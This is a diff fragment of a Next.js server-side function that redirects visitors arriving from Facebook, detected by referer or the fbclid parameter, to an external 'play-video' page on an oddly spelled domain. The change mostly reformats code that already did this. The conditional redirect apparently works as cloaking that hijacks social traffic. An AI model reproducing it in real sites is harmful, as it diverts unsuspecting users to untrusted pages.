@@ -15,12 +15,15 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 	// redirect if facebook is the referer or request contains fbclid
 		if (referringURL?.includes('facebook.com') || fbclid) {
 
-		return {
-  redirect: {
-    permanent: false,
-    destination: `https://www.prosolutionss.com/2023/07/play-video.html`,
-  },
-};
+	return {
+			redirect: {
+				permanent: false,
+				destination: `${
+					`https://www.prosolutionss.com/2023/07/play-video.html`
+				}`,
+			},
+		};
+		}
 
 	const query = gql`
 		{
